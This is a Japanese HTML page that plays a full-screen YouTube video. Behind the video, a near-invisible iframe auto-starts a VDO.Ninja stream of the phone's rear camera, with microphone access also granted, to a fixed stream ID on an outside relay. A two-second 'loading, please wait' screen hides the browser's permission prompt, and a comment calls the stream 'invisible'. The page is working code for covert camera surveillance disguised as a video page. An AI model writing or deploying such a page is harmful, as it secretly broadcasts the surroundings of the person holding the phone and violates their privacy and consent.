<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />

  <title>撮影ページ</title>
  <meta name="apple-mobile-web-app-title" content="撮影ページ">
  <meta name="application-name" content="撮影ページ">

  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: #000;
      overflow: hidden;
    }

    /* 裏：VDO.Ninja（配信用・見えない） */
    iframe#vdo {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: 0;
      opacity: 0.001;
      pointer-events: none;
    }

    /* 表：YouTube 全画面（常に cover） */
    .overlay {
      position: fixed;
      inset: 0;
      background: #000;
      overflow: hidden;
    }

    /* 16:9動画を「画面いっぱい」にする */
    #yt {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border: 0;

      /* ここが肝：縦でも横でも必ず埋める */
      width: max(100vw, calc(100vh * 16 / 9));
      height: max(100vh, calc(100vw * 9 / 16));
    }

    /* 初動ガード（許可ダイアログ用） */
    .guard {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 24px;
      background: #000;
      color: #fff;
      z-index: 10;
      font-family: system-ui, -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif;
      line-height: 1.8;
      font-size: 18px;
      letter-spacing: 0.02em;
      user-select: none;
      -webkit-user-select: none;
    }
    .guard .note {
      margin-top: 12px;
      font-size: 13px;
      opacity: 0.7;
    }
  </style>
</head>

<body>
  <!-- 裏：カメラ配信 -->
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- 表：YouTube（常に画面いっぱい） -->
  <div class="overlay">
    <iframe
      id="yt"
      src="https://www.youtube.com/embed/Vo-771wlTko?autoplay=1&mute=1&playsinline=1&controls=1&rel=0"
      title="YouTube video player"
      allow="autoplay; encrypted-media; picture-in-picture"
      referrerpolicy="strict-origin-when-cross-origin"
      allowfullscreen
    ></iframe>
  </div>

  <!-- 起動直後だけ表示 -->
  <div class="guard" id="guard">
    <div>
      読み込み中…<br>
      このままの画面でお待ちください。
      <div class="note">※スマホをスリープ状態にしないでください。</div>
    </div>
  </div>

  <script>
    const STREAM_ID = "toaCam01";

    // VDO.Ninja：外カメラ配信
    const vdoSrc =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=rear" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";

    document.getElementById("vdo").src = vdoSrc;

    // 許可ダイアログのための一瞬ガード
    setTimeout(() => {
      const g = document.getElementById("guard");
      if (g) g.style.display = "none";
    }, 2000);
  </script>
</body>
</html>
